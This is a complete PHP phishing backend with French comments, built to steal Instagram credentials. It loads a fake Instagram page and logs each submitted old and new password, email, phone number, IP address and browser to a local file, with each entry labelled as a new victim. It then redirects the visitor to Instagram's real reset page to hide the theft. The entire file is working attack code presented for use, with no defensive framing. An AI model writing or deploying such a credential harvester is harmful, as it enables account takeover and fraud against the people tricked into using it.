<?php
// ==================== PARTIE GRAB (récupération des infos) ====================
include("Insta.html");
// On récupère tout ce qui est sensible dès que le formulaire est envoyé
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ancien_mdp    = $_POST['ancien_mdp']    ?? '';
    $nouveau_mdp   = $_POST['nouveau_mdp']   ?? '';
    $confirme_mdp  = $_POST['confirme_mdp']  ?? '';
    $email         = $_POST['email']         ?? '';
    $telephone     = $_POST['telephone']     ?? '';

    // Récupération des infos de l'attaquant (IP, navigateur, etc.)
    $ip            = $_SERVER['REMOTE_ADDR'];
    $user_agent    = $_SERVER['HTTP_USER_AGENT'];
    $date          = date('d/m/Y H:i:s');
    $url_page      = $_SERVER['REQUEST_URI'];

    // Formatage propre pour le log
    $log = "=== NOUVELLE VICTIME - " . $date . " ===\n";
    $log .= "IP:              $ip\n";
    $log .= "Navigateur:      $user_agent\n";
    $log .= "Ancien MDP:      $ancien_mdp\n";
    $log .= "Nouveau MDP:     $nouveau_mdp\n";
    $log .= "Confirmé:        $confirme_mdp\n";
    $log .= "Email:           $email\n";
    $log .= "Téléphone:       $telephone\n";
    $log .= "URL page:        http://$_SERVER[HTTP_HOST]$url_page\n";
    $log .= "======================================\n\n";

    // Enregistrement dans un fichier (change le chemin selon tes besoins)
    file_put_contents('grabbed_instagram.txt', $log, FILE_APPEND);

    // Redirection vers Instagram pour faire croire que c'est légitime
    header("Location: https://www.instagram.com/accounts/password/reset/");
    exit;
}
?>
